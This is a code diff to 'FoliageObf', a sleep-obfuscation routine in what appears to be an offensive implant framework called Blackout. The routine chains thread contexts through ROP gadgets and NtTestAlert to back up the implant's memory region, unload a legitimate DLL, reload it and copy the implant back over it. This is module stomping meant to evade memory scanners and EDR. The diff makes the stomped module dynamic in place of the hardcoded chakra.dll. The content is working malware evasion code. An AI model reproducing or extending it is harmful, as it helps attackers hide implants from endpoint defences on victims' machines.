@@ -86,9 +86,8 @@ FUNC VOID FoliageObf(
     HANDLE hSlpThread    = NULL;
     HANDLE hMainThread   = NtCurrentThread();
 
-    CHAR    LibraryFr[]= { 'c', 'h', 'a', 'k', 'r', 'a', '.', 'd', 'l', 'l', 0 }; // todo: dynamic get
-    HMODULE hLibraryFr = Instance()->Win32.GetModuleHandleA( LibraryFr );        // todo: get module using LdrModuleAddr | discover hash of the chakra.dll
     PVOID   OldProt    = NULL;
+    HANDLE  TmpVal     = NULL;
 
     CONTEXT CtxMain   = { 0 };
     CONTEXT CtxBackup = { 0 };
@@ -96,7 +95,7 @@ FUNC VOID FoliageObf(
 
     UINT16 ic = 0;
 
-    CONTEXT Ctx[10] = { 0 };
+    CONTEXT Ctx[10] = { 0 }; // stomp 9 - normal 6
 
     Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
     if ( Status != 0x00 ) { __debugbreak; return; }    
@@ -108,7 +107,14 @@ FUNC VOID FoliageObf(
     );
     if ( Status != 0x00 ) { __debugbreak; return; }
 
-    if ( Blackout().Backup ) BK_PRINT( "[OBF] Sleepobf with advanced module stomping\n[OBF] Mapped backup address @ 0x%p\n", Blackout().Backup );
+    if ( Blackout().Stomp.Backup ) {
+        GetStompedModule();
+        BK_PRINT( 
+            "\n[OBF] Sleepobf with advanced module stomping\n"
+            "[OBF] Mapped backup address  @ 0x%p\n[OBF] Module name %ws @ 0x%p\n"
+            , Blackout().Stomp.Backup, Blackout().Stomp.UsMod.Buffer, Blackout().Stomp.ModBase 
+        );
+    }
 
     BK_PRINT( "\n" );
     BK_PRINT( "[BK] Blackout base address    @ 0x%p [0x%x bytes]\n", Blackout().Region.Base, Blackout().Region.Length );
@@ -124,7 +130,7 @@ FUNC VOID FoliageObf(
     Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
     if ( Status != 0x00 ) { __debugbreak; return; }
 
-    for ( INT i = 0; i < 9; i++ ) {
+    for ( INT i = 0; i < 10; i++ ) {
         MmCopy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
     }
 
@@ -136,11 +142,11 @@ FUNC VOID FoliageObf(
     *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
     ic++;
 
-    if ( Blackout().Backup ) {
+    if ( Blackout().Stomp.Backup ) {
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
-        Ctx[ic].Rcx = Blackout().Backup;
+        Ctx[ic].Rcx = Blackout().Stomp.Backup;
         Ctx[ic].Rdx = Blackout().Region.Base;
         Ctx[ic].R8  = Blackout().Region.Length;
         *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
@@ -148,13 +154,13 @@ FUNC VOID FoliageObf(
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.LdrUnloadDll;
-        Ctx[ic].Rcx = hLibraryFr;
+        Ctx[ic].Rcx = Blackout().Stomp.ModBase;
         *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget; 
-        Ctx[ic].Rbx = &Instance()->Win32.LoadLibraryExA; //todo: change to ldrloaddll
-        Ctx[ic].Rcx = LibraryFr;
+        Ctx[ic].Rbx = &Instance()->Win32.LoadLibraryExW;
+        Ctx[ic].Rcx = Blackout().Stomp.UsMod.Buffer;
         Ctx[ic].Rdx = NULL;
         Ctx[ic].R8  = DONT_RESOLVE_DLL_REFERENCES;
         *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
@@ -185,7 +191,7 @@ FUNC VOID FoliageObf(
     *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
     ic++;
 
-    if ( Blackout().Backup ) {
+    if ( Blackout().Stomp.Backup ) {
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
         Ctx[ic].Rcx = Blackout().Region.Base;
@@ -198,7 +204,7 @@ FUNC VOID FoliageObf(
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.RtlCopyMemory;
         Ctx[ic].Rcx = Blackout().Region.Base;
-        Ctx[ic].Rdx = Blackout().Backup;
+        Ctx[ic].Rdx = Blackout().Stomp.Backup;
         Ctx[ic].R8  = Blackout().Region.Length;
         *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
